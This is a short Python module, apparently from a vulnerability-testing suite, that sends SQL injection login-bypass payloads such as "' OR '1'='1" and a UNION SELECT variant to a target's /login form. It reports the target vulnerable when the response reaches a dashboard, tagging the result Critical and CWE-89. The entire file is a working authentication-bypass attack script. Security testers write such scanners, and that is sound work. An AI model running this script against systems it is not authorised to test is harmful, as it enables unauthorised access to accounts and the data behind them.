from __future__ import annotations

import requests

from attack_suite.result_schema import AttackResult
from attack_suite.modules.common import post_form


def run(target_url: str) -> AttackResult:
    payloads = ["' OR '1'='1", "' OR '1'='1' -- ", "admin' UNION SELECT 'admin','x' --"]
    session = requests.Session()
    evidence_parts: list[str] = []
    vulnerable = False

    for payload in payloads:
        try:
            response = post_form(
                session,
                target_url,
                "/login",
                {"username": payload, "password": "irrelevant"},
                timeout=5,
                allow_redirects=True,
            )
            if "Dashboard" in response.text or response.url.endswith("/dashboard"):
                vulnerable = True
                evidence_parts.append(f"Payload succeeded: {payload}")
            else:
                evidence_parts.append(f"Payload blocked: {payload}")
        except Exception as exc:
            evidence_parts.append(f"Error for payload {payload}: {exc}")

    return AttackResult(
        attack_name="SQL Injection",
        target=target_url,
        vulnerable=vulnerable,
        evidence="; ".join(evidence_parts),
        severity="Critical",
        cwe_id="CWE-89",
    )
